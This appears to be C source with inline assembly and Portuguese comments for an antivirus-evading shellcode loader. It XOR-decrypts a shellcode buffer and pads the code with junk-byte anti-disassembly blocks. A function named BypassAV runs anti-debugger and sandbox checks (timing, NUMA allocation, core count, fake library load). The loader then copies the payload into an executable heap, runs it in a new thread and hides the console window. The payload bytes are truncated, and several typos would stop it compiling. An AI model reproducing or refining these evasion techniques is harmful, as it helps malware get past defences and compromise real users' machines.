unsigned char key[] = "F0rb1dd3n";

for (int i = 0; i < strlen(buf); i++) {
   buf[i] ^= key[i % sizeof(key)];
}

char shellcode[] =
"\x0a\x65\x9b...";

char key[] = "W3ll";

Rotina de decrypt

void DecryptShellcode() {
   for (i = 0; i < sizeof(shellcode)-1; i++) {
      // Lixo Garbege
	  __asm
	  {
	     PUSH EAX
		 XOR EAX, EAX
		 JZ True1
		 __asm __emit(0xca)
		 __asm __emit(0x55)
		 __asm __emit(0x78)
		 __asm __emit(0x2c)
		 __asm __emit(0x02)
		 __asm __emit(0x9b)
		 __asm __emit(0x6e)
		 __asm __emit(0xe9)
		 __asm __emit(0x3d)
		 __asm __emit(0x6f)
	   True1:
	      POP EAX
	   }
	   // Descriptografando com a chave
	   shellcode[i] ^= key[i % sizeof(key)];
	   //shellcode[i] ^= 11;
	   
	   // Mais Lixo
	   __asm
	   {
	      PUSH EAX
		  XOR EAX, EAX
		  JZ True2
		  __asm __emit(0xd5)
		  __asm __emit(0xb6)
		  __asm __emit(0x43)
		  __asm __emit(0x87)
		  __asm __emit(0xde)
		  __asm __emit(0x37)
		  __asm __emit(0x24)
		  __asm __emit(0xb0)
		  __asm __emit(0x3d)
		  __asm __emit(0xee)
	   True2:
	      POP EAX
	   }
	}
}

bool BypassAV() {
   __asm
   {
   CheckDebugger:
      PUSH EAX
	  MOV EAX, DWORD PTR FS : [0x18]
	  
	  __asm
	  {
	     PUSH EAX
		 XOR EAX, EAX
		 JZ J
		 __asm _eemit(0xEA)
	  J:
	     POP EAX
	  }
	  
	  MOV EAX, DWORD PTR[EAX + 0x30]
	  
	  __asm
	  {
	     PUSH EAX
		 XOR EAX, EAX
		 JZ J2
		 __asm __emit(0xEA)
	  J2:
	    POP EAX		
	  }
	  CMP BYTE PTR[EAX + 2], 0
	  
	  __asm
	  {
		 PUSH EAX
         XOR EAX, EAX
		 JZ J3
		 __asm _eemit(0xEA)
      J3:
	     POP EAX
	  }
	  JNE CheckDebugger
	  POP EAX
	  
   }
   
   /*
   HANDLE AmberMutex = CreateMutex(NULL, TRUE, "muuuu");
   if (GetLasError() != ERROR_ALREADY_EXISTS) {
      WinExec("obfs.exe", 0);
   }
   */
   
   int cpt = 0;
   for (int i = 0; i < 100000000; i++) {
	   cpt++
   }
   
   LPVOID mem = NULL;
   mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
   if (mem == NULL) {
	   return false;
   }
   
   HINSTANCE DLL = LoadLibrary(TEXT("fake.exe"));
   if (DLL != NULL) {
	   return false;
   }
   
   int Tick = GetTickCount();
   Sleep(1000);
   int Tac = GetTickCount();
   if ((Tac - Tick) < 1000) {
	   retorn false;
   }
   
   SYSTEM_INFO SysGuide;
   GetSystemInfo(&SysGuide);
   int CoreNum = SysGuide.dwNumberOfProcessors;
   if (CoreNum < 2) {
	   return false;
   }
   
   /*
   char * Memdmp = NULL;
   Memdmp = (char *)malloc(100000000);
   if (memdmp != NULL) {
     memset(Memdmp, 00, 100000000);
      free(Memdmp);
   } else {
      return false;
   }
   */
   
   return true;
}

void ExecuteShellcode() {
	
   HANDLE heapVar;
   LPVOID lpvAddr;
   HANDLE hHand;
   DWORD dwWaitResult;
   DWORD threadID;

   heapVar = HeapCreate(0x00040000, strlen(shellcode), 0); // <--- Torna a HEAP Executável
   MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "HeapAlloc");
   lpvAddr = Allocate(heapVar, 0x00000008, strlen(shellcode)); //<--- Inicializa a aloca~ção de memória Zerada
   RtMoveMemory(lpvAddr, shellcode, strlen(shellcode));
   hHanmd = CreateThread(NULL,0,LPTHREAD_START_ROUTIME(lpvAddr),NULL,0,&trheadID);
   while (true) {
      BypassAV();
   }
	
}

int main(int argc, char * argv[]) {
	
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	
	/*
	if(strstr(argv[0], "obfs.exe") > 0) {
		// Decrypta shellcode e executa
	}
	*/
	
	if (!BypassAV()) {
		return false;		
	} else {
		DecryptShellcode();
		ExecuteShellcode();
	}
}